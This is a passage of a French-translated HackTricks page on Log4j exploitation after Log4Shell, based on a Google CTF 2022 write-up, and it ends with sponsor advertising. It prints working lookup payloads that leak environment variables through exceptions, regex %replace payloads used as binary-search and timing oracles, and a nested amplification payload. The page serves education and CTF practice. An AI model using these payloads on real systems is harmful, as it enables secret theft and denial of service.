* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - Trouver des biblioth√®ques vuln√©rables locales

### Laboratoires pour tester

* [**Machine LogForge HTB**](https://app.hackthebox.com/tracks/UHC-track)
* [**Salle Solar Try Hack Me**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Exploitation apr√®s Log4Shell

Dans ce [**writeup CTF**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), il est bien expliqu√© comment il est potentiellement **possible** d'**abuser** de certaines fonctionnalit√©s de **Log4J**.

La [**page de s√©curit√©**](https://logging.apache.org/log4j/2.x/security.html) de Log4j contient des phrases int√©ressantes :

> √Ä partir de la version 2.16.0 (pour Java 8), la fonctionnalit√© de **recherche de messages a √©t√© compl√®tement supprim√©e**. Les recherches dans la configuration fonctionnent toujours. De plus, Log4j d√©sactive d√©sormais l'acc√®s √† JNDI par d√©faut. Les recherches JNDI dans la configuration doivent maintenant √™tre activ√©es explicitement.

> √Ä partir de la version 2.17.0 (et 2.12.3 et 2.3.1 pour Java 7 et Java 6), **seules les cha√Ænes de recherche dans la configuration sont √©tendues de mani√®re r√©cursive** ; dans toute autre utilisation, seule la recherche de niveau sup√©rieur est r√©solue et les recherches imbriqu√©es ne sont pas r√©solues.

Cela signifie que par d√©faut, vous pouvez **oublier l'utilisation de toute exploitation `jndi`**. De plus, pour effectuer des **recherches r√©cursives**, vous devez les configurer.

Par exemple, dans ce CTF, cela √©tait configur√© dans le fichier log4j2.xml :
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Recherches d'environnement

Dans ce CTF, l'attaquant contr√¥lait la valeur de `${sys:cmd}` et devait exfiltrer le drapeau √† partir d'une variable d'environnement.\
Comme on peut le voir sur cette page dans les [**charges utiles pr√©c√©dentes**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification), il existe diff√©rentes fa√ßons d'acc√©der aux variables d'environnement, telles que : **`${env:FLAG}`**. Dans ce CTF, cela √©tait inutile, mais cela pourrait √™tre utile dans d'autres sc√©narios r√©els.

### Exfiltration dans les exceptions

Dans le CTF, vous ne pouviez pas acc√©der √† stderr de l'application Java en utilisant log4J, mais les exceptions Log4J sont envoy√©es √† stdout, qui √©tait imprim√© dans l'application Python. Cela signifiait qu'en d√©clenchant une exception, nous pouvions acc√©der au contenu. Une exception pour exfiltrer le drapeau √©tait : **`${java:${env:FLAG}}`.** Cela fonctionne parce que **`${java:CTF{blahblah}}`** n'existe pas et une exception avec la valeur du drapeau sera affich√©e :

![](<../../.gitbook/assets/image (157).png>)

### Exceptions de mod√®les de conversion

Juste pour mentionner, vous pouvez √©galement injecter de nouveaux [**mod√®les de conversion**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout) et d√©clencher des exceptions qui seront enregistr√©es dans `stdout`. Par exemple :

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

Cela n'a pas √©t√© utile pour exfiltrer des donn√©es √† l'int√©rieur du message d'erreur, car la recherche n'√©tait pas r√©solue avant le mod√®le de conversion, mais cela pourrait √™tre utile pour d'autres choses comme la d√©tection.

### Mod√®les de conversion avec regex

Cependant, il est possible d'utiliser certains **mod√®les de conversion qui prennent en charge les regex** pour exfiltrer des informations √† partir d'une recherche en utilisant des regex et en abusant des comportements de **recherche binaire** ou **bas√©s sur le temps**.

* **Recherche binaire via les messages d'exception**

Le mod√®le de conversion **`%replace`** peut √™tre utilis√© pour **remplacer** du **contenu** dans une **cha√Æne de caract√®res** m√™me en utilisant des **regex**. Cela fonctionne comme ceci : `replace{pattern}{regex}{substitution}`\
En abusant de ce comportement, vous pouvez faire en sorte que **replace d√©clenche une exception si le regex correspond** √† quelque chose √† l'int√©rieur de la cha√Æne de caract√®res (et aucune exception si ce n'est pas trouv√©) comme ceci :
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **Bas√© sur le temps**

Comme mentionn√© dans la section pr√©c√©dente, **`%replace`** prend en charge les **regexes**. Il est donc possible d'utiliser une charge utile de la page [**ReDoS**](../regular-expression-denial-of-service-redos.md) pour provoquer un **d√©passement de d√©lai** en cas de d√©couverte du drapeau.\
Par exemple, une charge utile comme `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` d√©clencherait un **d√©passement de d√©lai** dans ce CTF.

Dans ce [**writeup**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), au lieu d'utiliser une attaque ReDoS, une attaque d'**amplification** a √©t√© utilis√©e pour provoquer une diff√©rence de temps dans la r√©ponse :

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Si le drapeau commence par `flagGuess`, le drapeau entier est remplac√© par 29 `#` (j'ai utilis√© ce caract√®re car il ne fait probablement pas partie du drapeau). **Chacun des 29 `#` r√©sultants est ensuite remplac√© par 54 `#`**. Ce processus est r√©p√©t√© **6 fois**, ce qui donne un total de ` 29*54*54^6* =`` `` `**`96816014208`  `#`**`!**
>
> Le remplacement de tant de `#` d√©clenchera le d√©lai de 10 secondes de l'application Flask, ce qui entra√Ænera l'envoi du code d'√©tat HTTP 500 √† l'utilisateur. (Si le drapeau ne commence pas par `flagGuess`, nous recevrons un code d'√©tat non-500)

## R√©f√©rences

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Trouvez les vuln√©rabilit√©s les plus importantes afin de pouvoir les corriger plus rapidement. Intruder suit votre surface d'attaque, effectue des analyses de menaces proactives, trouve des probl√®mes dans l'ensemble de votre pile technologique, des API aux applications web en passant par les syst√®mes cloud. [**Essayez-le gratuitement**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) d√®s aujourd'hui.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Vous travaillez dans une **entreprise de cybers√©curit√©** ? Vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ? ou souhaitez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
